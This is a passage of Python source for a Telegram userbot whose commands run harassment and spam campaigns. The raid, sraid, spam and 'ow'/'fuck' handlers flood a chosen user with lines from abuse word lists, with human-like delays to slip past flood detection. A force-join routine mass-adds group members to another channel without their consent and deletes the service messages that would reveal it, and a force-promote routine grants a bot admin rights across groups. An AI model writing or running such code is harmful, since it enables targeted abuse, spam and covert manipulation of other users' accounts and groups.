                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Target not found.</blockquote>")
                return
            for key in ["SUDO_LEVEL_1", "SUDO_LEVEL_2"]:
                if t_id in cfg.get(key, []):
                    cfg[key].remove(t_id)
            save_config(cfg)
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🗑 <b>Removed from Sudo:</b> <code>{t_id}</code></blockquote>")

        elif re.match(r"(?i)^\.sudolist$", text):
            asyncio.create_task(event.delete())
            s1  = cfg.get("SUDO_LEVEL_1", [])
            s2  = cfg.get("SUDO_LEVEL_2", [])
            msg = ("<blockquote>🛡️ <b>SUDO LIST</b>\n\n"
                   f"<b>Level 1 (Limited):</b> {', '.join(str(x) for x in s1) or 'None'}\n"
                   f"<b>Level 2 (Full):</b> {', '.join(str(x) for x in s2) or 'None'}</blockquote>")
            await safe_send_and_track(client, chat_id, msg)

        elif re.match(r"(?i)^\.dmsec$", text):
            asyncio.create_task(event.delete())
            istate.dmsec_active = not istate.dmsec_active
            st = "ENABLED ✅" if istate.dmsec_active else "DISABLED ❌"
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🛡️ <b>DM Security: {st}</b></blockquote>")

        elif re.match(r"(?i)^\.config$", text):
            asyncio.create_task(event.delete())
            speeds  = cfg.get("DEFAULT_SPEEDS", {})
            fonts   = cfg.get("ACTIVE_FONTS", {})
            typings = cfg.get("ACTIVE_TYPING", {})
            safe    = "ON" if cfg.get("SAFE_MODE") else "OFF"
            sync    = "ON" if cfg.get("MASTER_SYNC") else "OFF"
            spd_line = "  ".join(f"{k}={v}s" for k, v in speeds.items())
            fnt_line = "  ".join(f"{k}={v}"  for k, v in fonts.items())
            typ_line = "  ".join(f"{k}={'Y' if v else 'N'}" for k, v in typings.items())
            aliases  = cfg.get("CMD_ALIASES", {}).get(my_id_str, {})
            ali_line = "  ".join(f"{k}→{v}" for k, v in aliases.items()) or "none"
            msg = (
                f"<blockquote>⚙️ <b>4ST CONFIG</b>"
                f"  Safe:<code>{safe}</code>  Sync:<code>{sync}</code>\n\n"
                f"⚡ <b>Spd:</b>  <code>{spd_line}</code>\n"
                f"🔤 <b>Fnt:</b>  <code>{fnt_line}</code>\n"
                f"⌨️ <b>Typ:</b>  <code>{typ_line}</code>\n"
                f"🔗 <b>Ali:</b>  <code>{ali_line}</code></blockquote>"
            )
            await safe_send_and_track(client, chat_id, msg)

        elif re.match(r"(?i)^\.speed\s+(\w+)\s+([\d.]+)$", text):
            asyncio.create_task(event.delete())
            m   = re.search(r"(?i)^\.speed\s+(\w+)\s+([\d.]+)$", text)
            cmd = m.group(1).lower()
            spd = float(m.group(2))
            cfg["DEFAULT_SPEEDS"][cmd] = spd
            save_config(cfg)
            # Silent — log to bot DM only, never visible in group
            asyncio.create_task(send_module_log(
                f"⚡ <b>Speed Set</b>\n"
                f"Module: <code>{cmd}</code>  →  <code>{spd}s</code>"))

        elif re.match(r"(?i)^\.font\s+(\w+)\s+([0-5])$", text):
            asyncio.create_task(event.delete())
            m   = re.search(r"(?i)^\.font\s+(\w+)\s+([0-5])$", text)
            cmd = m.group(1).lower()
            idx = int(m.group(2))
            cfg["ACTIVE_FONTS"][cmd] = idx
            save_config(cfg)
            asyncio.create_task(send_module_log(
                f"🔤 <b>Font Set</b>\n"
                f"Module: <code>{cmd}</code>  →  Font <code>{idx}</code>"))

        elif re.match(r"(?i)^\.typing\s+(\w+)\s+(on|off)$", text):
            asyncio.create_task(event.delete())
            m   = re.search(r"(?i)^\.typing\s+(\w+)\s+(on|off)$", text)
            cmd = m.group(1).lower()
            val = m.group(2).lower() == "on"
            cfg["ACTIVE_TYPING"][cmd] = val
            save_config(cfg)
            asyncio.create_task(send_module_log(
                f"⌨️ <b>Typing Set</b>\n"
                f"Module: <code>{cmd}</code>  →  <code>{'ON' if val else 'OFF'}</code>"))

        elif re.match(r"(?i)^\.safemode(?:\s+(on|off))?$", text):
            asyncio.create_task(event.delete())
            m_sf = re.search(r"(?i)^\.safemode(?:\s+(on|off))?$", text)
            sub  = (m_sf.group(1) or "").lower()
            if sub == "on":
                cfg["SAFE_MODE"] = True
            elif sub == "off":
                cfg["SAFE_MODE"] = False
            else:
                cfg["SAFE_MODE"] = not cfg.get("SAFE_MODE", False)
            save_config(cfg)
            st = "ON ✅" if cfg["SAFE_MODE"] else "OFF ❌"
            asyncio.create_task(send_module_log(
                f"🛡️ <b>Safe Mode: {st}</b>\n"
                f"{'Jitter + flood guard active — human-like delays.' if cfg['SAFE_MODE'] else 'Raw speed mode — no jitter.'}"))
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🛡️ <b>Safe Mode: {st}</b></blockquote>")

        elif re.match(r"(?i)^\.purge$", text):
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to the message to start purge from.</blockquote>")
                return
            msg_ids = []
            async for msg in client.iter_messages(chat_id,
                                                   min_id=reply_msg.id - 1,
                                                   max_id=event.id):
                msg_ids.append(msg.id)
            if msg_ids:
                await client.delete_messages(chat_id, msg_ids)

        elif re.match(r"(?i)^\.startpic$", text):
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Kisi photo pe reply karo .startpic se.</blockquote>")
                return
            _has_photo = getattr(reply_msg, 'photo', None) or getattr(reply_msg, 'sticker', None)
            if not _has_photo:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply karna hai kisi <b>photo</b> pe.</blockquote>")
                return
            try:
                _pic_path = os.path.join(DATA_DIR, "saved_startpic.jpg")
                await client.download_media(reply_msg, file=_pic_path)
                cfg["SAVED_START_PIC_PATH"] = _pic_path
                save_config(cfg)
                await safe_send_and_track(client, chat_id,
                    "<blockquote>✅ <b>Start pic saved!</b> Reboot ke baad bhi set rahega. 📸</blockquote>")
            except Exception as _ep:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Save failed: <code>{_ep}</code></blockquote>")

        elif re.match(r"(?i)^\.targetlist$", text):
            asyncio.create_task(event.delete())
            targets = istate.target_lists.get(chat_id, set())
            rraid   = istate.rraid_active_users.get(chat_id)
            msg     = "<blockquote>🎯 <b>ACTIVE TARGETS</b>\n\n"
            if targets:
                msg += f"<b>Tracked IDs:</b> {', '.join(str(x) for x in targets)}\n"
            if rraid:
                msg += f"<b>RRaid Target:</b> <code>{rraid}</code>\n"
            if not targets and not rraid:
                msg += "No active targets.\n"
            msg += "</blockquote>"
            await safe_send_and_track(client, chat_id, msg)

        elif re.match(r"(?i)^\.addtarget(?:\s+(.+))?$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            _m_at    = re.search(r"(?i)^\.addtarget(?:\s+(.+))?$", text)
            _targ_a  = _m_at.group(1).strip() if _m_at.group(1) else None
            _t_id_at = await resolve_target(client, event, _targ_a)
            if not _t_id_at:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Target not found. Reply to msg or provide @username/ID.</blockquote>")
                return
            istate.target_lists.setdefault(chat_id, set()).add(_t_id_at)
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🎯 <b>Target Added:</b> <code>{_t_id_at}</code></blockquote>")

        elif re.match(r"(?i)^\.rmtarget(?:\s+(.+))?$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            _m_rt    = re.search(r"(?i)^\.rmtarget(?:\s+(.+))?$", text)
            _targ_r  = _m_rt.group(1).strip() if _m_rt.group(1) else None
            _t_id_rt = await resolve_target(client, event, _targ_r)
            if not _t_id_rt:
                await safe_send_and_track(client, chat_id, "<blockquote>❌ Target not found.</blockquote>")
                return
            _tset    = istate.target_lists.get(chat_id, set())
            _removed = _t_id_rt in _tset
            _tset.discard(_t_id_rt)
            _rstat   = "Removed" if _removed else "Not Found"
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🗑️ <b>Target {_rstat}:</b> <code>{_t_id_rt}</code></blockquote>")

        elif re.match(r"(?i)^\.rmtargetall$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            _cnt = len(istate.target_lists.get(chat_id, set()))
            istate.target_lists.pop(chat_id, None)
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🗑️ <b>All {_cnt} target(s) cleared.</b></blockquote>")

        elif re.match(r"(?i)^\.forcepromote(?:\s+(.+))?$", text):
            # .forcepromote @botusername
            # Goes to all GCs where userbot is admin → adds bot → promotes with invite+pin rights
            # Then sends full report. All action-messages deleted after 60s.
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            asyncio.create_task(event.delete())
            _fp_m    = re.match(r"(?i)^\.forcepromote(?:\s+(.+))?$", text)
            _fp_arg  = _fp_m.group(1).strip() if _fp_m.group(1) else None
            if not _fp_arg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Usage: <code>.forcepromote @botusername</code></blockquote>")
                return
            _fp_proc = await safe_send_and_track(client, chat_id,
                f"<blockquote>⚙️ <b>Force Promote Started…</b>\n"
                f"Bot: <code>{_fp_arg}</code>\nScanning all groups…</blockquote>")

            async def _run_force_promote(_c=client, _proc=_fp_proc,
                                          _bot_arg=_fp_arg, _ocid=chat_id):
                from telethon.tl.functions.channels import EditAdminRequest, InviteToChannelRequest
                from telethon.tl.types import ChatAdminRights
                from telethon.errors import ChatAdminRequiredError, FloodWaitError
                _report  = []
                _success = 0
                _failed  = 0
                try:
                    _bot_ent = await _c.get_entity(_bot_arg)
                    _bot_id  = _bot_ent.id
                except Exception as _ge:
                    try:
                        await _proc.edit(f"<blockquote>❌ Bot not found: <code>{_ge}</code></blockquote>",
                                         parse_mode='html')
                    except Exception: pass
                    return
                _rights = ChatAdminRights(invite_users=True, pin_messages=True)
                async for _dlg in _c.iter_dialogs():
                    if not (_dlg.is_group or _dlg.is_channel):
                        continue
                    _g_id    = _dlg.entity.id
                    _g_title = getattr(_dlg.entity, 'title', str(_g_id))
                    try:
                        _me_perms = await _c.get_permissions(_g_id, 'me')
                        if not getattr(_me_perms, 'is_admin', False):
                            continue
                        try:
                            await _c(InviteToChannelRequest(_g_id, [_bot_id]))
                        except Exception:
                            pass  # already in group
                        await asyncio.sleep(1)
                        await _c(EditAdminRequest(_g_id, _bot_id, _rights, rank="Bot"))
                        _report.append(f"  ✅ <code>{_g_title}</code> (<code>{_g_id}</code>)")
                        _success += 1
                    except ChatAdminRequiredError:
                        _report.append(f"  ⚠️ Not admin: <code>{_g_title}</code>")
                        _failed += 1
                    except FloodWaitError as _fw:
                        await asyncio.sleep(_fw.seconds + 5)
                        _report.append(f"  ⏳ FloodWait in <code>{_g_title}</code>")
                        _failed += 1
                    except Exception as _pe:
                        _report.append(f"  ❌ <code>{_g_title}</code>: {str(_pe)[:60]}")
                        _failed += 1
                    await asyncio.sleep(2)
                _summary = (
                    f"<blockquote>🤖 <b>Force Promote — Complete</b>\n"
                    f"Bot: <code>{_bot_arg}</code>\n"
                    f"✅ {_success}  ❌ {_failed}\n\n"
                    + "\n".join(_report[:50])
                    + ("\n<i>…truncated</i>" if len(_report) > 50 else "")
                    + "\n</blockquote>"
                )
                try:
                    await _proc.edit(_summary, parse_mode='html')
                except Exception:
                    await safe_send_and_track(_c, _ocid, _summary)
                await asyncio.sleep(60)
                try:
                    await _proc.delete()
                except Exception: pass

            asyncio.create_task(_run_force_promote())



        elif re.match(r"(?i)^\.fjadd\s+(\S+)$", text):
            # .fjadd @username — add user to FORCEJOIN_USERS custom list
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            _fja_arg = re.match(r"(?i)^\.fjadd\s+(\S+)$", text).group(1).strip()
            _fja_list = cfg.setdefault("FORCEJOIN_USERS", [])
            if _fja_arg not in _fja_list:
                _fja_list.append(_fja_arg)
                save_config(cfg)
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>✅ <b>Added to Force Join list:</b> <code>{_fja_arg}</code>\n"
                    f"Total: {len(_fja_list)} users</blockquote>")
            else:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>ℹ️ Already in list: <code>{_fja_arg}</code></blockquote>")

        elif re.match(r"(?i)^\.fjrm\s+(\S+)$", text):
            # .fjrm @username — remove from FORCEJOIN_USERS custom list
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            _fjr_arg  = re.match(r"(?i)^\.fjrm\s+(\S+)$", text).group(1).strip()
            _fjr_list = cfg.get("FORCEJOIN_USERS", [])
            if _fjr_arg in _fjr_list:
                _fjr_list.remove(_fjr_arg)
                cfg["FORCEJOIN_USERS"] = _fjr_list
                save_config(cfg)
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>🗑 <b>Removed from Force Join list:</b> <code>{_fjr_arg}</code></blockquote>")
            else:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Not in list: <code>{_fjr_arg}</code></blockquote>")

        elif re.match(r"(?i)^\.forcejoin(?:\s+(.+))?$", text):
            # .forcejoin @target_channel [all | custom | @u1 @u2 ...]
            # Adds members to target channel/group. Deletes service-bot messages at 0.001s.
            # 'all'    → all participants of current group
            # 'custom' → saved FORCEJOIN_USERS list
            # else     → specified @usernames
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            asyncio.create_task(event.delete())
            _fj_m = re.match(r"(?i)^\.forcejoin(?:\s+(.+))?$", text)
            _fj_args_raw = (_fj_m.group(1) or "").strip().split()
            if not _fj_args_raw:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ <b>Usage:</b>\n"
                    "<code>.forcejoin @channel all</code> — add all current group members\n"
                    "<code>.forcejoin @channel custom</code> — add saved custom list\n"
                    "<code>.forcejoin @channel @u1 @u2</code> — add specific users</blockquote>")
                return
            _fj_target  = _fj_args_raw[0]
            _fj_mode    = _fj_args_raw[1].lower() if len(_fj_args_raw) > 1 else ""
            _fj_users   = _fj_args_raw[1:] if len(_fj_args_raw) > 1 else []
            _fj_proc    = await safe_send_and_track(client, chat_id,
                f"<blockquote>⚙️ <b>Force Join Starting…</b>\n"
                f"Target: <code>{_fj_target}</code>\n"
                f"Mode: <code>{'all members' if _fj_mode == 'all' else 'custom list' if _fj_mode == 'custom' else 'specified users'}</code>\n"
                f"Scanning…</blockquote>")

            async def _run_force_join(_c=client, _proc=_fj_proc, _target=_fj_target,
                                       _mode=_fj_mode, _users=_fj_users, _ocid=chat_id,
                                       _gcid=chat_id):
                from telethon.tl.functions.channels import InviteToChannelRequest
                from telethon.tl.types import InputPeerUser, ChannelParticipantsSearch
                from telethon.errors import FloodWaitError, UserPrivacyRestrictedError, \
                    UserNotMutualContactError, ChatAdminRequiredError, UserAlreadyParticipantError

                _success_list = []  # (display_name, username, user_id)
                _failed_list  = []  # (display_name, reason)
                _svc_del_count = 0

                # ── Resolve target ──
                try:
                    _tgt_ent = await _c.get_entity(_target)
                    _tgt_id  = _tgt_ent.id
                    _tgt_title = getattr(_tgt_ent, 'title', _target)
                    _tgt_username = getattr(_tgt_ent, 'username', None)
                    _tgt_link = (f"https://t.me/{_tgt_username}" if _tgt_username
                                 else f"https://t.me/c/{str(_tgt_id).lstrip('-100')}/1")
                    _tgt_members = getattr(_tgt_ent, 'participants_count', '?')
                except Exception as _te:
                    try:
                        await _proc.edit(
                            f"<blockquote>❌ Target not found: <code>{_te}</code></blockquote>",
                            parse_mode='html')
                    except Exception: pass
                    return

                # ── Build user list ──
                _to_add = []
                try:
                    if _mode == "all":
                        async for _p in _c.iter_participants(_gcid, limit=500):
                            if not getattr(_p, 'bot', False) and _p.id != (await _c.get_me()).id:
                                _to_add.append(_p)
                    elif _mode == "custom":
                        _saved = cfg.get("FORCEJOIN_USERS", [])
                        for _un in _saved:
                            try:
                                _to_add.append(await _c.get_entity(_un))
                            except Exception as _ge:
                                _failed_list.append((_un, str(_ge)[:50]))
                    else:
                        for _un in _users:
                            try:
                                _to_add.append(await _c.get_entity(_un))
                            except Exception as _ge:
                                _failed_list.append((_un, str(_ge)[:50]))
                except Exception as _le:
                    _failed_list.append(("list_build", str(_le)[:80]))

                # ── Add each user ──
                for _usr in _to_add:
                    _uname_disp = (f"@{_usr.username}" if getattr(_usr, 'username', None)
                                   else f"{getattr(_usr, 'first_name', '')} {getattr(_usr, 'last_name', '')}".strip()
                                   or str(_usr.id))
                    try:
                        await _c(InviteToChannelRequest(_tgt_id, [_usr]))
                        _success_list.append((_uname_disp, getattr(_usr, 'username', None), _usr.id))
                    except UserAlreadyParticipantError:
                        _success_list.append((_uname_disp + " (already in)", getattr(_usr, 'username', None), _usr.id))
                    except (UserPrivacyRestrictedError, UserNotMutualContactError):
                        _failed_list.append((_uname_disp, "privacy restriction"))
                    except FloodWaitError as _fw:
                        await asyncio.sleep(_fw.seconds + 5)
                        try:
                            await _c(InviteToChannelRequest(_tgt_id, [_usr]))
                            _success_list.append((_uname_disp, getattr(_usr, 'username', None), _usr.id))
                        except Exception as _r2:
                            _failed_list.append((_uname_disp, str(_r2)[:50]))
                    except Exception as _ae:
                        _failed_list.append((_uname_disp, str(_ae)[:50]))
                    await asyncio.sleep(0.5)

                # ── Delete service/bot messages in target at 0.001s delay ──
                try:
                    _me_id = (await _c.get_me()).id
                    async for _svc_msg in _c.iter_messages(_tgt_id, limit=200):
                        _is_svc = (getattr(_svc_msg, 'action', None) is not None or
                                   (getattr(_svc_msg, 'sender', None) and
                                    getattr(_svc_msg.sender, 'bot', False) and
                                    _svc_msg.sender.id != _me_id))
                        if _is_svc:
                            try:
                                await _svc_msg.delete()
                                _svc_del_count += 1
                            except Exception:
                                pass
                            await asyncio.sleep(0.001)
                except Exception as _sd:
                    pass

                # ── Build deep report ──
                _s_lines = []
                for _dn, _un, _uid in _success_list[:40]:
                    _profile = f"https://t.me/{_un}" if _un else f"tg://user?id={_uid}"
                    _s_lines.append(f"  ✅ <a href='{_profile}'>{_dn}</a>")
                _f_lines = [f"  ❌ <code>{_dn}</code> — <i>{_r}</i>"
                            for _dn, _r in _failed_list[:20]]

                import datetime as _dt
                _now_str = _dt.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")

                _report = (
                    f"<blockquote>👥 <b>Force Join — Complete</b>\n"
                    f"──────────────────────\n"
                    f"🎯 <b>Target:</b> <a href='{_tgt_link}'>{_tgt_title}</a>\n"
                    f"👁 <b>Members (after):</b> {_tgt_members}\n"
                    f"🕐 <b>Completed:</b> {_now_str}\n"
                    f"──────────────────────\n"
                    f"✅ <b>Added:</b> {len(_success_list)}  ❌ <b>Failed:</b> {len(_failed_list)}\n"
                    f"🧹 <b>Service msgs deleted:</b> {_svc_del_count}\n"
                    f"──────────────────────\n"
                    + ("\n".join(_s_lines) or "  <i>none</i>")
                    + ("\n\n<b>Failed:</b>\n" + "\n".join(_f_lines) if _f_lines else "")
                    + ("\n<i>…truncated</i>" if len(_success_list) > 40 else "")
                    + "\n</blockquote>"
                )
                try:
                    await _proc.edit(_report, parse_mode='html', link_preview=False)
                except Exception:
                    await safe_send_and_track(_c, _ocid, _report)

            asyncio.create_task(_run_force_join())

        elif re.match(r"(?i)^\.cmnd\s+(\S+)\s+(\S+)$", text):
            # .cmnd <existing_module> <new_alias>
            # Creates a command alias — typing .new_alias triggers .existing_module
            # Example: .cmnd ow oye  → .oye now runs OW module
            asyncio.create_task(event.delete())
            m          = re.search(r"(?i)^\.cmnd\s+(\S+)\s+(\S+)$", text)
            target_cmd = m.group(1).lower().lstrip(".")   # existing module name
            alias_name = "." + m.group(2).lower().lstrip(".")  # new alias with dot
            cfg.setdefault("CMD_ALIASES", {}).setdefault(my_id_str, {})[alias_name] = target_cmd
            save_config(cfg)
            asyncio.create_task(send_module_log(
                f"🔗 <b>Alias Created</b>\n"
                f"<code>{alias_name}</code>  →  <code>.{target_cmd}</code>"))
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🔗 <b>Alias set:</b> <code>{alias_name}</code> → <code>.{target_cmd}</code></blockquote>")

        elif re.match(r"(?i)^\.rmcmnd\s+(\S+)$", text):
            # rmcmnd only removes text-custom-cmds, not module aliases
            # (aliases are permanent once set — by design)
            asyncio.create_task(event.delete())
            m       = re.search(r"(?i)^\.rmcmnd\s+(\S+)$", text)
            cname   = "." + m.group(1).lower().lstrip(".")
            # Only remove from CUSTOM_CMDS (text commands), never from CMD_ALIASES
            removed = cfg.get("CUSTOM_CMDS", {}).get(my_id_str, {}).pop(cname, None)
            if removed:
                save_config(cfg)
            asyncio.create_task(send_module_log(
                f"🗑️ <b>Custom Cmd Removed</b>\n<code>{cname}</code>"))

        elif re.match(r"(?i)^\.raid\s+(\d+)(?:\s+(\S+?))?(?:\s+(-?\d+))?$", text):
            if not await verify_privileges(event, client=client): return
            m         = re.search(r"(?i)^\.raid\s+(\d+)(?:\s+(\S+?))?(?:\s+(-?\d+))?$", text)
            count     = int(m.group(1))
            target_str= m.group(2)
            dest      = int(m.group(3)) if m.group(3) and m.group(3).lstrip('-').isdigit() else chat_id
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            t_id      = await resolve_target(client, event, target_str)
            if not t_id:
                await safe_send_and_track(client, dest,
                    "<blockquote>❌ Target not found. Reply to a message or provide @username / user_id.</blockquote>")
                return
            # Owner protection
            if t_id == cfg.get("OWNER_ID", 0):
                await safe_send_and_track(client, dest,
                    f"<a href='tg://user?id={event.sender_id}'>🙄 Tu</a> ye to mere papa hai inpe (raid spam jo hoga, wo nahi kr skta 😔❣️ I love u my dad, my superhero 😘)")
                return
            istate.target_lists.setdefault(dest, set()).add(t_id)
            # Get the target's display name for tagging in raid messages
            try:
                _t_ent   = await client.get_entity(t_id)
                _t_name  = (getattr(_t_ent, 'first_name', '') or
                             getattr(_t_ent, 'title', '') or str(t_id))
            except Exception:
                _t_name  = str(t_id)
            target_mention = f"<a href='tg://user?id={t_id}'>{_t_name}</a> "
            abuses = load_words(ABUSE_PATH, DEFAULT_ABUSES)
            async def _run_raid(_count=count, _dest=dest, _abuses=abuses,
                               _mention=target_mention, _reply=reply_msg):
                try:
                    for _ in range(_count):
                        speed     = _safe_delay(cfg["DEFAULT_SPEEDS"].get("raid", 0.1))
                        is_typing = cfg["ACTIVE_TYPING"].get("raid", False)
                        f_idx     = cfg["ACTIVE_FONTS"].get("raid", 0)
                        word      = _mention + apply_font_transformer(random.choice(_abuses), f_idx)
                        if is_typing:
                            try:
                                async with client.action(_dest, 'typing'):
                                    await asyncio.sleep(_human_typing_dur(speed))
                            except Exception: pass
                        await safe_send_and_track(client, _dest, word,
                            reply_to=_reply.id if _reply else None, delay=speed)
                except asyncio.CancelledError:
                    pass
            # Run raid in background so event loop stays free and .stopraid can cancel it
            istate.active_tasks["raid"] = asyncio.create_task(_run_raid())
            asyncio.create_task(send_module_log(
                f"⚔️ <b>Raid Started</b>\n"
                f"Target: <code>{t_id}</code>  ({_t_name})  Count: <code>{count}</code>  Chat: <code>{dest}</code>"))

        elif re.match(r"(?i)^\.sraid$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a message to start sraid.</blockquote>")
                return
            # Owner protection
            if reply_msg.sender_id == cfg.get("OWNER_ID", 0):
                await safe_send_and_track(client, chat_id,
                    f"<a href='tg://user?id={event.sender_id}'>🙄 Tu</a> ye to mere papa hai inpe (raid spam jo hoga, wo nahi kr skta 😔❣️ I love u my dad, my superhero 😘)")
                return
            istate.sraid_state[chat_id] = {
                "target_id":       reply_msg.sender_id,
                "reply_to":        reply_msg.id,
                "lines":           load_words(SRAID_PATH, DEFAULT_SRAID),
                "msg_count":       0,
                "pending_msg_ids": [],
                "last_bot_msg_id": None,
            }
            await safe_send_and_track(client, chat_id,
                "<blockquote>💬 <b>Sraid activated.</b> Har 3 msg pe tag, reply pe next line. 🎯</blockquote>")

        elif re.match(r"(?i)^\.stopsraid$", text):
            asyncio.create_task(event.delete())
            istate.sraid_state.pop(chat_id, None)
            await safe_send_and_track(client, chat_id,
                "<blockquote>🛑 <b>Sraid deactivated.</b></blockquote>")

        elif re.match(r"(?i)^\.(g)?spam\s+(\d+)\s+(.+?)(?:\s+(-?\d+))?$", text):
            if not await verify_privileges(event, client=client): return
            m        = re.search(r"(?i)^\.(g)?spam\s+(\d+)\s+(.+?)(?:\s+(-?\d+))?$", text)
            is_ghost = bool(m.group(1))
            count    = int(m.group(2))
            raw_text = m.group(3)
            dest     = int(m.group(4)) if is_ghost and m.group(4) else chat_id
            reply_msg = await event.get_reply_message()
            asyncio.create_task(event.delete())
            # Owner protection
            if reply_msg and reply_msg.sender_id == cfg.get("OWNER_ID", 0):
                await safe_send_and_track(client, dest,
                    f"<a href='tg://user?id={event.sender_id}'>🙄 Tu</a> ye to mere papa hai inpe (raid spam jo hoga, wo nahi kr skta 😔❣️ I love u my dad, my superhero 😘)")
                return

            # ── Preserve Telegram formatting entities from the original message ──
            # When the user applies bold/italic/blockquote via Telegram's built-in
            # toolbar (not HTML tags), the text arrives as plain text + entity list.
            # We find where raw_text sits in the full message (by UTF-16 offset)
            # and slice+adjust the entity list to cover only the spam portion.
            _spam_entities = None
            try:
                _orig_entities = getattr(event.message, 'entities', None) or []
                if _orig_entities:
                    _full = event.text or ""
                    _char_start = _full.find(raw_text)
                    if _char_start >= 0:
                        _u16 = _codepoint_to_utf16_offsets(_full)
                        _us  = _u16[_char_start]
                        _ue  = _u16[_char_start + len(raw_text)]
                        import copy as _copy
                        _extracted = []
                        for _e in _orig_entities:
                            _es = _e.offset
                            _ee = _e.offset + _e.length
                            if _ee <= _us or _es >= _ue:
                                continue
                            _ne        = _copy.copy(_e)
                            _ne.offset = max(_es, _us) - _us
                            _ne.length = min(_ee, _ue) - max(_es, _us)
                            if _ne.length > 0:
                                _extracted.append(_ne)
                        if _extracted:
                            _spam_entities = _extracted
            except Exception:
                pass

            istate.active_tasks["spam"] = asyncio.current_task()
            try:
                for _ in range(count):
                    speed     = _safe_delay(cfg["DEFAULT_SPEEDS"].get("spam", 0.1))
                    is_typing = cfg["ACTIVE_TYPING"].get("spam", False)
                    f_idx     = cfg["ACTIVE_FONTS"].get("spam", 0)
                    if is_typing:
                        try:
                            async with client.action(dest, 'typing'):
                                await asyncio.sleep(_human_typing_dur(speed))
                        except Exception: pass
                    if _spam_entities:
                        # Send with original Telegram entities (bold, italic, etc.)
                        # Don't apply font transformer — it would mangle entity offsets
                        await safe_send_and_track(client, dest, raw_text,
                            reply_to=reply_msg.id if (reply_msg and not is_ghost) else None,
                            delay=speed,
                            formatting_entities=_spam_entities)
                    else:
                        # No Telegram entities — apply font transformer, send as HTML
                        word = apply_font_transformer(raw_text, f_idx)
                        await safe_send_and_track(client, dest, word,
                            reply_to=reply_msg.id if (reply_msg and not is_ghost) else None,
                            delay=speed)
            except asyncio.CancelledError:
                pass

        elif re.match(r"(?i)^\.(g)?(ow|fuck)(?:\s+(.+?))?(?:\s+(-?\d+))?$", text):
            if not await verify_privileges(event, client=client): return
            m        = re.search(r"(?i)^\.(g)?(ow|fuck)(?:\s+(.+?))?(?:\s+(-?\d+))?$", text)
            is_ghost = bool(m.group(1))
            mode     = m.group(2).lower()
            target_str = m.group(3)
            dest     = int(m.group(4)) if is_ghost and m.group(4) else chat_id
            asyncio.create_task(event.delete())
            t_id, initial_mid = None, None
            if not is_ghost:
                reply_msg = await event.get_reply_message()
                if reply_msg and reply_msg.sender_id:
                    t_id        = reply_msg.sender_id
                    initial_mid = reply_msg.id
            elif target_str:
                try:
                    ent  = await client.get_entity(target_str)
                    t_id = ent.id
                except Exception: pass
            if not t_id:
                await safe_send_and_track(client, dest,
                    "<blockquote>❌ <b>Target not found.</b></blockquote>")
                return
            # Owner protection
            if t_id == cfg.get("OWNER_ID", 0):
                await safe_send_and_track(client, dest,
                    f"<a href='tg://user?id={event.sender_id}'>🙄 Tu</a> ye to mere papa hai inpe (raid spam jo hoga, wo nahi kr skta 😔❣️ I love u my dad, my superhero 😘)")
                return
            istate.target_lists.setdefault(dest, set()).add(t_id)
            if initial_mid:
                istate.last_target_msg[dest] = initial_mid
            words_db = load_words(
                OW_PATH if mode == "ow" else ABUSE_PATH,
                DEFAULT_OWS if mode == "ow" else DEFAULT_ABUSES
            )
            istate.active_tasks[mode] = asyncio.current_task()
            if mode == "ow":
                istate.ow_active[dest] = True
            asyncio.create_task(send_module_log(
                f"{'👁️ OW' if mode == 'ow' else '💢 Fuck'} <b>Started</b>\n"
                f"Target: <code>{t_id}</code>  Chat: <code>{dest}</code>"))
            _loop_task = asyncio.current_task()
            _word_idx  = 0   # sequential index — cycles through words_db in order
            try:
                while True if mode == "fuck" else istate.ow_active.get(dest, True):
                    # Hard-stop check — if task.cancel() was called, exit immediately
                    if _loop_task is not None and _loop_task.cancelled():
                        break
                    curr_mid  = istate.last_target_msg.get(dest)
                    speed     = _safe_delay(cfg["DEFAULT_SPEEDS"].get(mode, 0.1))
                    is_typing = cfg["ACTIVE_TYPING"].get(mode, False)
                    f_idx     = cfg["ACTIVE_FONTS"].get(mode, 0)
                    # Sequential line-by-line from ow.txt / abuse.txt — NOT random
                    word      = apply_font_transformer(words_db[_word_idx % len(words_db)], f_idx)
                    _word_idx += 1
                    if curr_mid:
                        if is_typing:
                            try:
                                async with client.action(dest, 'typing'):
                                    await asyncio.sleep(_human_typing_dur(speed))
                            except Exception: pass
                        # track=False: target-reply messages must NOT be auto-deleted on .stop
                        await safe_send_and_track(client, dest, word,
                                                   reply_to=curr_mid, delay=speed, track=False)
                    else:
                        await asyncio.sleep(0.3)
            except asyncio.CancelledError:
                pass

